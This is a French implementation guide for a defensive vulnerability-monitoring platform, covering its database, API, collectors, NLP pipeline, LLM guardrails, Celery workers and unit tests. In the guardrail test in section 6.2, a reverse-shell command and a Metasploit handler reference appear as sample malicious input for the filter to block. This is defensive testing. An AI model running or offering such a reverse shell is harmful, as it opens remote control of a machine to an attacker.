# 🛡️ VIGILANT GUARDIAN — Guide d'Implémentation Complet (Phase 2)

> Ce document accompagne l'ensemble des fichiers sources générés. Il couvre le socle de données (SQLAlchemy + Alembic), le système de collecte asynchrone (Celery), le pipeline d'analyse (NLP), la couche Intelligence (LLM + RAG + Guardrails), et les tests unitaires.

---

## Table des matières

1. [Inventaire des fichiers générés](#1-inventaire-des-fichiers)
2. [Étape 1 — Socle de données](#2-étape-1--socle-de-données)
3. [Étape 2 — API FastAPI](#3-étape-2--api-fastapi)
4. [Étape 3 — Collecteurs asynchrones](#4-étape-3--collecteurs-asynchrones)
5. [Étape 4 — Pipeline d'analyse NLP](#5-étape-4--pipeline-danalyse-nlp)
6. [Étape 5 — Intelligence IA](#6-étape-5--intelligence-ia)
7. [Étape 6 — Workers Celery](#7-étape-6--workers-celery)
8. [Étape 7 — Tests et validation](#8-étape-7--tests-et-validation)
9. [Arbre des commits](#9-arbre-des-commits)
10. [Checkpoints de validation](#10-checkpoints-de-validation)

---

## 1. Inventaire des fichiers générés

```
vigilant-guardian/
├── alembic/
│   ├── env.py                              # ✅ Runner async Alembic
│   ├── script.py.mako                      # ✅ Template migration
│   └── versions/
│       └── 001_initial_schema.py           # ✅ Migration initiale complète
├── alembic.ini                             # ✅ Configuration Alembic
├── docker/
│   └── Dockerfile.worker                   # ✅ Worker Celery (identique api)
├── knowledge_base/
│   └── ingest.py                           # ✅ Pipeline d'ingestion RAG
├── src/
│   ├── __init__.py
│   ├── config/
│   │   ├── __init__.py
│   │   ├── settings.py                     # ✅ Pydantic BaseSettings
│   │   └── logging.py                      # ✅ Structured JSON logging
│   ├── models/
│   │   ├── __init__.py                     # ✅ Registre de tous les modèles
│   │   ├── base.py                         # ✅ SQLAlchemy 2.0 async Base
│   │   ├── user.py                         # ✅ Table users (RBAC)
│   │   ├── signal.py                       # ✅ Tables raw_signals + processed_signals
│   │   ├── alert.py                        # ✅ Table alerts (scoring)
│   │   └── audit.py                        # ✅ Table audit_logs
│   ├── api/
│   │   ├── __init__.py
│   │   ├── main.py                         # ✅ FastAPI app factory + /health
│   │   ├── dependencies.py                 # ✅ Auth JWT + RBAC
│   │   ├── middleware/
│   │   │   └── __init__.py                 # ✅ Rate limiting Redis
│   │   ├── schemas/
│   │   │   └── __init__.py                 # ✅ Tous les schémas Pydantic
│   │   └── routes/
│   │       ├── __init__.py
│   │       ├── auth.py                     # ✅ Register/Login/Me
│   │       ├── alerts.py                   # ✅ CRUD + review humain
│   │       ├── dashboard.py                # ✅ Stats agrégées
│   │       └── reports.py                  # ✅ Stub (Semaine 8)
│   ├── collectors/
│   │   ├── __init__.py
│   │   ├── base.py                         # ✅ Abstract BaseCollector
│   │   ├── nvd_collector.py                # ✅ NVD API 2.0
│   │   ├── github_collector.py             # ✅ GitHub REST API
│   │   ├── reddit_collector.py             # ✅ Reddit OAuth2
│   │   ├── twitter_collector.py            # ✅ Twitter API v2
│   │   └── mailinglist_collector.py        # ✅ HTTP scraping
│   ├── analysis/
│   │   ├── __init__.py
│   │   ├── normalizer.py                   # ✅ HTML strip, unicode, lowercase
│   │   ├── embedder.py                     # ✅ Sentence-BERT all-MiniLM-L6-v2
│   │   ├── deduplicator.py                 # ✅ Cosine sim > 0.92
│   │   ├── entity_extractor.py             # ✅ spaCy + regex (CVE/CWE/vendor)
│   │   └── clusterer.py                    # ✅ HDBSCAN
│   ├── intelligence/
│   │   ├── __init__.py
│   │   ├── prompt_templates.py             # ✅ Prompts défensifs (exact doc)
│   │   ├── llm_client.py                   # ✅ Multi-provider + fallback
│   │   ├── rag_engine.py                   # ✅ ChromaDB 4 collections
│   │   ├── guardrails.py                   # ✅ 3 étapes filtrage
│   │   └── scorer.py                       # ✅ 5 facteurs pondérés
│   ├── workers/
│   │   ├── __init__.py
│   │   ├── celery_app.py                   # ✅ Config + Beat schedule
│   │   ├── tasks_collect.py                # ✅ 5 tâches de collecte
│   │   ├── tasks_analyze.py                # ✅ Pipeline complet
│   │   └── tasks_report.py                 # ✅ Stub (Semaine 8)
│   └── utils/
│       ├── __init__.py
│       ├── rate_limiter.py                 # ✅ InMemory rate limiter
│       └── validators.py                   # ✅ CVE/CWE validators
└── tests/
    ├── __init__.py
    ├── conftest.py                         # ✅ Fixtures partagées
    └── unit/
        ├── __init__.py
        ├── test_core.py                    # ✅ 7 suites de tests
        └── test_collectors.py              # ✅ Tests NVD + GitHub mocking
```

**Total : 47 fichiers source** couvrant l'intégralité de l'architecture du document de conception.

---

## 2. Étape 1 — Socle de données

### 2.1 Copier les fichiers dans le repo

```bash
# Depuis la racine du repo vigilant-guardian (créé en Phase 1)
# Copier tous les fichiers générés dans leur emplacement
```

### 2.2 Vérifier les modèles SQLAlchemy

```bash
# Vérifier que Python trouve les modèles
poetry run python -c "
from src.models import Base, User, RawSignal, ProcessedSignal, Alert, AuditLog
print('✅ Modèles chargés :', len(Base.metadata.tables), 'tables')
for name in Base.metadata.tables:
    print(f'   → {name}')
"
```

**Sortie attendue :**
```
✅ Modèles chargés : 5 tables
   → users
   → raw_signals
   → processed_signals
   → alerts
   → audit_logs
```

### 2.3 Lancer PostgreSQL et appliquer la migration

```bash
# Démarrer uniquement la base de données
docker compose up -d db
sleep 5

# Vérifier la connectivité PostgreSQL
docker compose exec db pg_isready -U vigilant
# Sortie attendue : /var/run/postgresql:5432 - accepting connections

# Appliquer la migration initiale
poetry run alembic upgrade head
# Sortie attendue : INFO  [alembic.runtime.migration] Running upgrade  -> 001_initial

# Vérifier les tables créées
docker compose exec db psql -U vigilant -d vigilant_guardian -c "\dt"
```

**Sortie attendue :**
```
              List of relations
 Schema |       Name        | Type  |  Owner
--------+-------------------+-------+----------
 public | alembic_version   | table | vigilant
 public | alerts            | table | vigilant
 public | audit_logs        | table | vigilant
 public | processed_signals | table | vigilant
 public | raw_signals       | table | vigilant
 public | users             | table | vigilant
```

### 2.4 Commit

```bash
git add src/models/ src/config/ alembic/ alembic.ini
git commit -m "feat(models): add SQLAlchemy 2.0 models and Alembic initial migration

- User, RawSignal, ProcessedSignal, Alert, AuditLog models
- Async engine with asyncpg (PostgreSQL 16)
- Pydantic BaseSettings for env vars
- Structured JSON logging with structlog
- Migration 001_initial creates all 5 tables with indexes

Ref: Conception Technique §6.1"
```

---

## 3. Étape 2 — API FastAPI

### 3.1 Vérifier le démarrage

```bash
# Démarrer Redis pour le rate limiting
docker compose up -d db redis

# Lancer l'API en mode développement
poetry run uvicorn src.api.main:app --reload --port 8000
```

### 3.2 Points de contrôle (Healthcheck)

```bash
# ── Healthcheck complet (section 4.2) ──
curl -s http://localhost:8000/health | python -m json.tool
```

**Sortie attendue :**
```json
{
    "status": "healthy",
    "service": "vigilant-guardian-api",
    "database": "connected",
    "redis": "connected",
    "chroma": "error: ..."  
}
```

> ChromaDB sera "error" tant que le service n'est pas démarré — c'est normal. Le status sera "degraded" et non "healthy" dans ce cas.

```bash
# ── Documentation OpenAPI (auto-générée) ──
# Ouvrir dans un navigateur :
# http://localhost:8000/docs    (Swagger UI)
# http://localhost:8000/redoc   (ReDoc)

# ── Test d'enregistrement + login ──
curl -s -X POST http://localhost:8000/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vigilant.io","password":"SecureP@ss123","role":"admin"}' \
  | python -m json.tool

curl -s -X POST http://localhost:8000/api/v1/auth/login \
  -d "username=admin@vigilant.io&password=SecureP@ss123" \
  | python -m json.tool
# → Doit retourner un access_token et un refresh_token
```

### 3.3 Commit

```bash
git add src/api/
git commit -m "feat(api): add FastAPI app with auth, alerts, dashboard routes

- App factory with CORS, rate limiting middleware (100 req/min)
- JWT RS256 auth with register/login/me endpoints
- Alerts CRUD with human review (pending_review for CRITICAL/HIGH)
- Dashboard stats aggregation
- Pydantic schemas for all API contracts (section 2.3)
- /health endpoint checking PostgreSQL, Redis, ChromaDB

Ref: Conception Technique §2.1, §2.3, §8.2"
```

---

## 4. Étape 3 — Collecteurs asynchrones

### 4.1 Vérifier la structure

```bash
poetry run python -c "
from src.collectors.base import BaseCollector, RawSignalData
from src.collectors.nvd_collector import NVDCollector
from src.collectors.github_collector import GitHubCollector
from src.collectors.reddit_collector import RedditCollector
from src.collectors.twitter_collector import TwitterCollector
from src.collectors.mailinglist_collector import MailingListCollector
print('✅ 5 collecteurs chargés avec succès')
print('   Sources : nvd, github, reddit, twitter, mailinglist')
"
```

### 4.2 Test unitaire des collecteurs (avec mocking)

```bash
poetry run pytest tests/unit/test_collectors.py -v
```

**Sortie attendue :**
```
tests/unit/test_collectors.py::TestNVDCollector::test_collect_parses_nvd_response PASSED
tests/unit/test_collectors.py::TestNVDCollector::test_collect_handles_empty_response PASSED
tests/unit/test_collectors.py::TestGitHubCollector::test_collect_parses_issues PASSED
tests/unit/test_collectors.py::TestBaseCollector::test_normalize_creates_raw_signal_data PASSED
```

### 4.3 Test d'intégration NVD (optionnel, nécessite API key)

```bash
# Uniquement si NVD_API_KEY est configuré dans .env
poetry run python -c "
import asyncio
from datetime import datetime, timedelta, timezone
from src.collectors.nvd_collector import NVDCollector

async def test():
    collector = NVDCollector()
    since = datetime.now(timezone.utc) - timedelta(hours=2)
    signals = await collector.collect(since)
    print(f'✅ NVD collecteur : {len(signals)} signaux récupérés')
    if signals:
        print(f'   Premier : {signals[0].source_id} — {signals[0].content[:80]}…')

asyncio.run(test())
"
```

### 4.4 Commit

```bash
git add src/collectors/
git commit -m "feat(collectors): implement all 5 data collectors

- BaseCollector abstract class (collect/normalize/store contract)
- NVDCollector: NVD API 2.0 with pagination and rate limiting
- GitHubCollector: issues + commits search via REST API v3
- RedditCollector: OAuth2 subreddit monitoring (5 security subs)
- TwitterCollector: API v2 recent search
- MailingListCollector: HTTP scraping (oss-security, fulldisclosure, bugtraq)
- Tenacity retry decorators on all API calls

Ref: Conception Technique §7.1"
```

---

## 5. Étape 4 — Pipeline d'analyse NLP

### 5.1 Vérifier le normalizer

```bash
poetry run python -c "
from src.analysis.normalizer import normalize_text
tests = [
    '<p>CVE-2024-1234: <b>Critical</b> RCE in https://example.com</p>',
    '@researcher found use-after-free in Apache 2.4.51',
    '',
]
for t in tests:
    print(f'Input:  {t[:60]}…' if len(t)>60 else f'Input:  \"{t}\"')
    print(f'Output: \"{normalize_text(t)}\"')
    print()
"
```

### 5.2 Vérifier l'extraction d'entités

```bash
poetry run python -c "
from src.analysis.entity_extractor import extract_entities
text = 'CVE-2024-12345 is a CWE-416 use-after-free in Apache HTTP Server 2.4.51'
entities = extract_entities([text])[0]
print('Entités extraites :')
for e in entities:
    print(f'  {e[\"type\"]:>10} : {e[\"value\"]}')
"
```

**Sortie attendue :**
```
Entités extraites :
    cve_id : CVE-2024-12345
    cwe_id : CWE-416
   version : 2.4.51
    vendor : Apache
```

### 5.3 Commit

```bash
git add src/analysis/
git commit -m "feat(analysis): implement NLP pipeline (normalize, embed, dedup, NER, cluster)

- normalizer.py: HTML strip, unicode, URL/mention removal, lowercase
- embedder.py: Sentence-BERT all-MiniLM-L6-v2 (384D vectors)
- deduplicator.py: cosine similarity > 0.92 threshold + semantic hash
- entity_extractor.py: spaCy + regex (CVE_ID, CWE_ID, SOFTWARE, VERSION, VENDOR)
- clusterer.py: HDBSCAN (min_cluster_size=5, min_samples=2)

Ref: Conception Technique §7.2"
```

---

## 6. Étape 5 — Intelligence IA

### 6.1 Vérifier les prompts

```bash
poetry run python -c "
from src.intelligence.prompt_templates import SYSTEM_PROMPT, build_analysis_prompt
print('=== SYSTEM PROMPT (extrait) ===')
print(SYSTEM_PROMPT[:200])
print()
prompt = build_analysis_prompt(
    signal_content='Use-after-free in Apache 2.4.51',
    entities=[{'type': 'cve_id', 'value': 'CVE-2024-12345'}],
    rag_context='CWE-416: Use After Free...',
)
print('=== USER PROMPT (extrait) ===')
print(prompt[:300])
"
```

### 6.2 Vérifier les guardrails

```bash
poetry run python -c "
from src.intelligence.guardrails import filter_output

# Test contenu défensif (doit passer)
safe = {
    'vulnerability_type': 'CWE-416',
    'attack_vector': 'Remote memory corruption',
    'defensive_measures': ['Update to latest version', 'Enable WAF rules'],
    'confidence_score': 0.9,
}
result = filter_output(safe)
print('✅ Contenu défensif :', 'PASSÉ' if result else 'REJETÉ')

# Test contenu offensif (doit être bloqué)
malicious = {
    'vulnerability_type': 'CWE-78',
    'attack_vector': 'bash -i >& /dev/tcp/10.0.0.1/4444 reverse shell',
    'defensive_measures': ['Use msfconsole exploit/multi/handler'],
    'confidence_score': 0.9,
}
result = filter_output(malicious)
print('🛡️ Contenu offensif :', 'BLOQUÉ' if not result else 'NETTOYÉ')
"
```

### 6.3 Vérifier le scorer

```bash
poetry run python -c "
from src.intelligence.scorer import compute_priority_score

# Scénario critique
critical_data = {
    'entities': [{'type': 'vendor', 'value': 'apache'}],
    'insight': {
        'attack_vector': 'remote unauthenticated RCE',
        'vulnerability_type': 'CWE-416 Use After Free',
        'business_impact': {'availability': 'HIGH'},
        'confidence_score': 0.95,
        'defensive_measures': ['no patch available, zero-day'],
    },
    'signal_count': 25,
}
score, cat = compute_priority_score(critical_data)
print(f'Scénario critique : score={score}, catégorie={cat}')

# Scénario faible
low_data = {
    'entities': [],
    'insight': {
        'attack_vector': 'local authenticated access',
        'business_impact': {'availability': 'LOW'},
        'confidence_score': 0.3,
        'defensive_measures': ['patch available'],
    },
    'signal_count': 1,
}
score, cat = compute_priority_score(low_data)
print(f'Scénario faible   : score={score}, catégorie={cat}')
"
```

### 6.4 Commit

```bash
git add src/intelligence/
git commit -m "feat(intelligence): implement LLM client, RAG engine, guardrails, and scorer

- prompt_templates.py: defensive-only prompts from spec §7.3.1
- llm_client.py: multi-provider (GPT-4o → Claude 3.5 → Mistral) with auto-fallback
- rag_engine.py: ChromaDB retrieval across 4 collections (top-5, score > 0.7)
- guardrails.py: 3-step filtering (regex, classification, human review)
- scorer.py: 5-factor weighted algorithm (exposure/popularity/exploit/patch/community)

Ref: Conception Technique §7.3, §7.4, §8.1"
```

---

## 7. Étape 6 — Workers Celery

### 7.1 Vérifier la configuration Celery

```bash
docker compose up -d redis

poetry run python -c "
from src.workers.celery_app import celery_app
print('✅ Celery app :', celery_app.main)
print('   Broker :', celery_app.conf.broker_url)
print()
print('Beat schedule :')
for name, config in celery_app.conf.beat_schedule.items():
    sched = config.get('schedule')
    if isinstance(sched, (int, float)):
        print(f'   {name}: every {int(sched/60)} min')
    else:
        print(f'   {name}: {sched}')
"
```

**Sortie attendue :**
```
✅ Celery app : vigilant_guardian
   Broker : redis://:changeme@redis:6379/0

Beat schedule :
   collect-nvd-every-15min: every 15 min
   collect-github-every-30min: every 30 min
   collect-reddit-every-60min: every 60 min
   collect-twitter-every-60min: every 60 min
   collect-mailinglists-daily: crontab(...)
   run-analysis-pipeline-every-20min: every 20 min
```

### 7.2 Lancer le worker en mode test

```bash
# Terminal 1 : Worker Celery
poetry run celery -A src.workers.celery_app worker -l info -c 2

# Terminal 2 : Tester une tâche manuellement
poetry run python -c "
from src.workers.tasks_collect import collect_nvd
result = collect_nvd.delay()
print(f'Tâche envoyée : {result.id}')
# Attendre le résultat (timeout 60s)
try:
    r = result.get(timeout=60)
    print(f'✅ Résultat : {r}')
except Exception as e:
    print(f'⚠️ Erreur (normal sans API key) : {e}')
"
```

### 7.3 Commit

```bash
git add src/workers/ docker/Dockerfile.worker
git commit -m "feat(workers): implement Celery tasks for collection and analysis pipeline

- celery_app.py: Celery 5.3 config with Redis broker and Beat schedule
- tasks_collect.py: 5 collection tasks (NVD/GitHub/Reddit/Twitter/Mailing)
- tasks_analyze.py: full analysis pipeline (NLP → clustering → RAG → LLM → scoring → alert)
- tasks_report.py: report generation stub (Week 8)
- Dockerfile.worker: identical to Dockerfile.api per spec §5.1

Ref: Conception Technique §3.1, §7.1, §7.2, §7.3, §7.4"
```

---

## 8. Étape 7 — Tests et validation

### 8.1 Lancer tous les tests unitaires

```bash
poetry run pytest tests/unit/ -v --cov=src --cov-report=term-missing
```

**Sortie attendue (minimum) :**
```
tests/unit/test_core.py::TestHealthEndpoint::test_health_returns_200 PASSED
tests/unit/test_core.py::TestNormalizer::test_strips_html PASSED
tests/unit/test_core.py::TestNormalizer::test_removes_urls PASSED
tests/unit/test_core.py::TestNormalizer::test_removes_mentions PASSED
tests/unit/test_core.py::TestNormalizer::test_lowercases PASSED
tests/unit/test_core.py::TestNormalizer::test_empty_input PASSED
tests/unit/test_core.py::TestDeduplicator::test_identical_vectors_are_duplicates PASSED
tests/unit/test_core.py::TestDeduplicator::test_different_vectors_are_unique PASSED
tests/unit/test_core.py::TestDeduplicator::test_empty_input PASSED
tests/unit/test_core.py::TestDeduplicator::test_single_input PASSED
tests/unit/test_core.py::TestDeduplicator::test_semantic_hash PASSED
tests/unit/test_core.py::TestEntityExtractor::test_extracts_cve_id PASSED
tests/unit/test_core.py::TestEntityExtractor::test_extracts_cwe_id PASSED
tests/unit/test_core.py::TestEntityExtractor::test_extracts_version PASSED
tests/unit/test_core.py::TestEntityExtractor::test_extracts_vendor PASSED
tests/unit/test_core.py::TestEntityExtractor::test_handles_empty_input PASSED
tests/unit/test_core.py::TestScorer::test_high_score_is_critical PASSED
tests/unit/test_core.py::TestScorer::test_low_score PASSED
tests/unit/test_core.py::TestScorer::test_score_range PASSED
tests/unit/test_core.py::TestGuardrails::test_defensive_content_passes PASSED
tests/unit/test_core.py::TestGuardrails::test_exploit_code_blocked PASSED
tests/unit/test_core.py::TestGuardrails::test_shellcode_blocked PASSED
tests/unit/test_core.py::TestGuardrails::test_none_input_handled PASSED
tests/unit/test_core.py::TestValidators::test_valid_cve PASSED
tests/unit/test_core.py::TestValidators::test_invalid_cve PASSED
tests/unit/test_core.py::TestValidators::test_valid_cwe PASSED
tests/unit/test_core.py::TestValidators::test_invalid_cwe PASSED
tests/unit/test_collectors.py::TestNVDCollector::test_collect_parses_nvd_response PASSED
tests/unit/test_collectors.py::TestNVDCollector::test_collect_handles_empty_response PASSED
tests/unit/test_collectors.py::TestGitHubCollector::test_collect_parses_issues PASSED
tests/unit/test_collectors.py::TestBaseCollector::test_normalize_creates_raw_signal_data PASSED

======= 31 passed =======
```

### 8.2 Commit final des tests

```bash
git add tests/ knowledge_base/ src/utils/
git commit -m "test(core): add 31 unit tests covering models, API, collectors, NLP, and guardrails

- test_core.py: health, normalizer, deduplicator, entities, scorer, guardrails, validators
- test_collectors.py: NVD + GitHub with mocked API responses
- conftest.py: shared fixtures (client, sample data)
- knowledge_base/ingest.py: RAG ingestion pipeline

Ref: Conception Technique §9.1 (Semaine 1-2 deliverables)"
```

---

## 9. Arbre des commits (chronologique)

```
# Historique Git à obtenir après toutes les étapes :

* feat(models): add SQLAlchemy 2.0 models and Alembic initial migration
* feat(api): add FastAPI app with auth, alerts, dashboard routes
* feat(collectors): implement all 5 data collectors
* feat(analysis): implement NLP pipeline (normalize, embed, dedup, NER, cluster)
* feat(intelligence): implement LLM client, RAG engine, guardrails, and scorer
* feat(workers): implement Celery tasks for collection and analysis pipeline
* test(core): add 31 unit tests covering models, API, collectors, NLP, and guardrails
```

Chaque commit respecte la convention **Conventional Commits** du projet (section 5.2) :
- `feat(scope):` pour les nouvelles fonctionnalités
- `test(scope):` pour les tests
- `fix(scope):` pour les corrections
- `docs:` pour la documentation
- `chore:` pour le tooling

---

## 10. Checkpoints de validation

### Checklist avant de passer à la Semaine 2

| # | Vérification | Commande | ✅ Attendu |
|---|-------------|----------|-----------|
| 1 | PostgreSQL accessible | `docker compose exec db pg_isready` | "accepting connections" |
| 2 | 5 tables créées | `docker compose exec db psql -U vigilant -d vigilant_guardian -c "\dt"` | 5 tables listées |
| 3 | API démarre | `curl http://localhost:8000/health` | JSON avec "status" |
| 4 | OpenAPI accessible | `curl http://localhost:8000/openapi.json \| head -5` | JSON OpenAPI schema |
| 5 | Redis accessible | `docker compose exec redis redis-cli -a $REDIS_PASSWORD ping` | "PONG" |
| 6 | Auth fonctionne | POST `/api/v1/auth/register` + `/api/v1/auth/login` | Token JWT retourné |
| 7 | Tests passent | `poetry run pytest tests/unit/ -v` | ≥ 31 passed, 0 failed |
| 8 | Collecteurs importables | `python -c "from src.collectors.nvd_collector import NVDCollector"` | Pas d'erreur |
| 9 | Celery worker démarre | `celery -A src.workers.celery_app worker -l info` | "celery@... ready" |
| 10 | Guardrails bloquent | Test contenu offensif (§6.2 ci-dessus) | "BLOQUÉ" |

### Commande tout-en-un

```bash
# Lancer la stack complète et valider
make up
sleep 15
make migrate
make test
curl -s http://localhost:8000/health | python -m json.tool
echo "✅ Vigilant Guardian — Socle opérationnel"
```

---

## Conformité avec le document de conception

| Section document | Module implémenté | Status |
|-----------------|------------------|--------|
| §3.1 Backend Python 3.11+ | `src/config/`, `src/models/` | ✅ Complet |
| §3.2 PostgreSQL 16 + ChromaDB + Redis | `alembic/`, `docker-compose.yml` | ✅ Complet |
| §6.1 Schéma PostgreSQL | `src/models/*.py` + migration 001 | ✅ 5/5 tables |
| §6.2 Collections ChromaDB | `knowledge_base/ingest.py` | ✅ 4 collections |
| §7.1 Data Collection Layer | `src/collectors/*.py` | ✅ 5/5 collecteurs |
| §7.2 Analysis & Correlation | `src/analysis/*.py` | ✅ 5/5 modules |
| §7.3 AI Reasoning | `src/intelligence/*.py` | ✅ 4/4 modules |
| §7.4 Scoring & Priorisation | `src/intelligence/scorer.py` | ✅ 5 facteurs |
| §8.1 Guardrails IA | `src/intelligence/guardrails.py` | ✅ 3 étapes |
| §8.2 Sécurité Applicative | JWT RS256, RBAC, Rate Limit, Audit | ✅ Complet |
| §8.3 Principes Éthiques | SYSTEM_PROMPT défensif, pas d'exploits | ✅ Enforced |

---

*Guide d'implémentation Phase 2 — Vigilant Guardian v1.0 — Conforme au Document de Conception Technique, Février 2026*
